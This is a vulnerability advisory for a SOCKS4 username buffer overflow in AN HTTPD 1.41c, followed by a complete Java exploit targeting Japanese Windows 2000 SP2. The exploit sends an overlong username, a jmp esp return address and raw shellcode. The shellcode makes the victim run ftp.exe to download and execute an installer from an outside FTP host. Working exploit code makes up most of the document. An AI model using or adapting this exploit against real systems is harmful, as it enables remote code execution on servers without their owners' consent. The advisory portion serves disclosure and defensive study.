source: http://www.securityfocus.com/bid/6012/info

A buffer overflow vulnerability has been reported for AN HTTPD. The vulnerability is due to insufficient bounds checking of usernames for SOCKS4 requests.

When AN HTTPD acts as a SOCKS4 server, it handles user names in an unsafe manner. An attacker can exploit this vulnerability by sending an overly long username as part of a SOCKS4 request. This may overflow a buffer used by AN HTTPD and cause the server to overwrite adjacent memory. Successful exploitation may, in turn, lead to the execution of arbitrary code as the AN HTTPD process.

/*///////////////////////////////////////////////////////////////////////////

 AN HTTPD Version 1.41c SOCKS4 username buffer overflow exploit
  for Japanese Windows 2000 Pro (SP2)

 written by Kanatoko <anvil@jumperz.net>
 http://www.jumperz.net/

///////////////////////////////////////////////////////////////////////////*/

import java.net.*;
import java.io.*;

public class anhttpd141c_exploit
{
private static final int SOCKS_PORT        = 1080;

private String targetHost;
//----------------------------------------------------------------------------
public static void main( String[] args )
throws Exception
{
if( args.length != 1 )
        {
        System.out.println( "Usage: java anhttpd141c_exploit TARGETHOST( or IP )" );
        return;
        }
anhttpd141c_exploit instance = new anhttpd141c_exploit( args[ 0 ] );
instance.doIt();
}
//----------------------------------------------------------------------------
public anhttpd141c_exploit( String IN_targetHost )
throws Exception
{
targetHost        = IN_targetHost;
}
//----------------------------------------------------------------------------
private void doIt()
throws Exception
{
Socket socket        = new Socket( targetHost, SOCKS_PORT );
OutputStream os        = socket.getOutputStream();

byte[] socks4_request = {
(byte)0x04, (byte)0x01, (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x01
};

        // egg: download and start installing Netscape4.79 :)
        // http://www.jumperz.net/egg_netscape.cpp
byte[] egg = {
(byte)0x55, (byte)0x8B, (byte)0xEC, (byte)0x53, (byte)0xEB, (byte)0x57, (byte)0x90, (byte)0x90,
(byte)0x90, (byte)0x5B, (byte)0x33, (byte)0xC0, (byte)0x88, (byte)0x63, (byte)0x01, (byte)0x88,
(byte)0x63, (byte)0x03, (byte)0x83, (byte)0xC3, (byte)0x68, (byte)0x88, (byte)0x23, (byte)0x88,
(byte)0x63, (byte)0x21, (byte)0x88, (byte)0x63, (byte)0x2E, (byte)0x83, (byte)0xEB, (byte)0x68,
(byte)0x53, (byte)0x83, (byte)0xC3, (byte)0x02, (byte)0x53, (byte)0xB9, (byte)0xC2, (byte)0x1B,
(byte)0x02, (byte)0x78, (byte)0xFF, (byte)0xD1, (byte)0x50, (byte)0x83, (byte)0xC3, (byte)0x02,
(byte)0x53, (byte)0xB9, (byte)0x8B, (byte)0x38, (byte)0x02, (byte)0x78, (byte)0xFF, (byte)0xD1,
(byte)0x59, (byte)0xB9, (byte)0xB8, (byte)0x0E, (byte)0x01, (byte)0x78, (byte)0xFF, (byte)0xD1,
(byte)0x83, (byte)0xC3, (byte)0x65, (byte)0x53, (byte)0xB9, (byte)0x4A, (byte)0x9B, (byte)0x01,
(byte)0x78, (byte)0xFF, (byte)0xD1, (byte)0x83, (byte)0xC3, (byte)0x21, (byte)0x53, (byte)0xB9,
(byte)0x4A, (byte)0x9B, (byte)0x01, (byte)0x78, (byte)0xFF, (byte)0xD1, (byte)0xB8, (byte)0x94,
(byte)0x8F, (byte)0xE6, (byte)0x77, (byte)0xFF, (byte)0xD0, (byte)0xE8, (byte)0xA7, (byte)0xFF,
(byte)0xFF, (byte)0xFF, (byte)0x77, (byte)0x58, (byte)0x71, (byte)0x58, (byte)0x62, (byte)0x69,
(byte)0x6E, (byte)0x61, (byte)0x72, (byte)0x79, (byte)0x0A, (byte)0x67, (byte)0x65, (byte)0x74,
(byte)0x20, (byte)0x2F, (byte)0x70, (byte)0x75, (byte)0x62, (byte)0x2F, (byte)0x63, (byte)0x6F,
(byte)0x6D, (byte)0x6D, (byte)0x75, (byte)0x6E, (byte)0x69, (byte)0x63, (byte)0x61, (byte)0x74,
(byte)0x6F, (byte)0x72, (byte)0x2F, (byte)0x65, (byte)0x6E, (byte)0x67, (byte)0x6C, (byte)0x69,
(byte)0x73, (byte)0x68, (byte)0x2F, (byte)0x34, (byte)0x2E, (byte)0x37, (byte)0x39, (byte)0x2F,
(byte)0x77, (byte)0x69, (byte)0x6E, (byte)0x64, (byte)0x6F, (byte)0x77, (byte)0x73, (byte)0x2F,
(byte)0x77, (byte)0x69, (byte)0x6E, (byte)0x64, (byte)0x6F, (byte)0x77, (byte)0x73, (byte)0x39,
(byte)0x35, (byte)0x5F, (byte)0x6F, (byte)0x72, (byte)0x5F, (byte)0x6E, (byte)0x74, (byte)0x2F,
(byte)0x63, (byte)0x6F, (byte)0x6D, (byte)0x70, (byte)0x6C, (byte)0x65, (byte)0x74, (byte)0x65,
(byte)0x5F, (byte)0x69, (byte)0x6E, (byte)0x73, (byte)0x74, (byte)0x61, (byte)0x6C, (byte)0x6C,
(byte)0x2F, (byte)0x63, (byte)0x63, (byte)0x33, (byte)0x32, (byte)0x64, (byte)0x34, (byte)0x37,
(byte)0x39, (byte)0x2E, (byte)0x65, (byte)0x78, (byte)0x65, (byte)0x0A, (byte)0x71, (byte)0x75,
(byte)0x69, (byte)0x74, (byte)0x58, (byte)0x66, (byte)0x74, (byte)0x70, (byte)0x2E, (byte)0x65,
(byte)0x78, (byte)0x65, (byte)0x20, (byte)0x2D, (byte)0x73, (byte)0x3A, (byte)0x71, (byte)0x20,
(byte)0x2D, (byte)0x41, (byte)0x20, (byte)0x66, (byte)0x74, (byte)0x70, (byte)0x2E, (byte)0x6E,
(byte)0x65, (byte)0x74, (byte)0x73, (byte)0x63, (byte)0x61, (byte)0x70, (byte)0x65, (byte)0x2E,
(byte)0x63, (byte)0x6F, (byte)0x6D, (byte)0x58, (byte)0x63, (byte)0x63, (byte)0x33, (byte)0x32,
(byte)0x64, (byte)0x34, (byte)0x37, (byte)0x39, (byte)0x2E, (byte)0x65, (byte)0x78, (byte)0x65,
(byte)0x58
};

byte[] jmp_esp = {
(byte)0x02, (byte)0x4E, (byte)0x02, (byte)0x78
};

os.write( socks4_request );

        //where is memset? :0
for( int i = 0; i < 1020; ++i )
        {
        os.write( (byte)0x41 );
        }

os.write( jmp_esp );
os.write( egg );
os.write( (byte)0x00 );
}
//----------------------------------------------------------------------------
} 